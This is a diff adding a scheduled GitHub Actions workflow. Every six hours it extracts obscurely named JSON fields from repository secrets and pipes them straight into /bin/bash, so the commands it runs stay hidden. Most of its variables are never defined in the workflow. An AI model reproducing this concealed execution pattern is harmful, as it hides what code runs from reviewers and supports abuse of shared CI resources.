@@ -1,0 +1,24 @@
+name: congenxiwei
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: congenxiwei
+        env:
+          dp00: ${{ secrets.dp00 }}
+        run: |
+          echo $dp00 | jq -r .xzdiz6 | /bin/bash
+          echo $t131 | jq -r .cxee6 | /bin/bash
+          echo $enst38813 | jq -r .ewe58038 | /bin/bash
+          echo $xe2 | jq -r .celzn0991 | /bin/bash
+          echo $heqi99039 | jq -r .p5787 | /bin/bash
+          echo $kgzo2 | jq -r .pgtf16 | /bin/bash
+          echo $rhcg88 | jq -r .dxihf7 | /bin/bash
+          echo $gm5132 | jq -r .i514 | /bin/bash
+
